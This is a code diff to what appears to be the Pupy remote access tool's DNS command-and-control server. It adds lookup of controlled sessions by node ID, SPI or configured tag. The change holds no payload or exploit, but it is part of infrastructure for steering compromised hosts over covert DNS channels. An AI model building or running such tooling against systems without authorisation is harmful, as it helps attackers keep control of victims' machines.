@@ -18,6 +18,12 @@ from network.lib.igd import IGDClient, UPNPError
 
 class PupyDnsCommandServerHandler(DnsCommandServerHandler):
     def __init__(self, *args, **kwargs):
+        if 'config' in kwargs:
+            self.config = kwargs.get('config')
+            del kwargs['config']
+        else:
+            self.config = None
+
         DnsCommandServerHandler.__init__(self, *args, **kwargs)
 
     def connect(self, hosts, port, transport, node=None, default=False):
@@ -54,6 +60,47 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
             PasteLink(url, action=action),
             session=node, default=default
         )
+
+    def find_sessions(self, spi=None, node=None):
+        if spi or node:
+            results = []
+            if self.config and node:
+                if type(node) in (str,unicode):
+                    nodes = []
+                    for n in node.split(','):
+                        try:
+                            int(n, 16)
+                            nodes.append(n)
+                        except:
+                            for tagged in self.config.by_tags(n):
+                                nodes.append(tagged)
+
+                    if nodes:
+                        results = DnsCommandServerHandler.find_sessions(
+                            self, node=','.join(nodes)
+                        )
+                    else:
+                        results = []
+
+            if spi:
+                if type(spi) in (str,unicode):
+                    spis = []
+                    for s in spi.split(','):
+                        try:
+                            int(s, 16)
+                            spis.append(s)
+                        except:
+                            pass
+
+                    if spis:
+                        results += DnsCommandServerHandler.find_sessions(
+                            self, spi=','.join(spis)
+                        )
+        else:
+            results = DnsCommandServerHandler.find_sessions(self)
+
+        return results
+
 
 class PupyDnsCnc(object):
     def __init__(
@@ -101,7 +148,8 @@ class PupyDnsCnc(object):
         self.handler = PupyDnsCommandServerHandler(
             domain,
             credentials['DNSCNC_PRIV_KEY'],
-            recursor=recursor
+            recursor=recursor,
+            config=self.config
         )
 
         self.server = DnsCommandServer(
@@ -120,7 +168,8 @@ class PupyDnsCnc(object):
         self.server.stop()
 
     def list(self, node=None):
-        return [ session for session in self.handler.find_sessions(node=node) ]
+        return self.handler.find_sessions(node=node) \
+          or self.handler.find_sessions(spi=node)
 
     def connect(self, host=None, port=None, transport=None, node=None, default=False):
         return self.handler.connect(
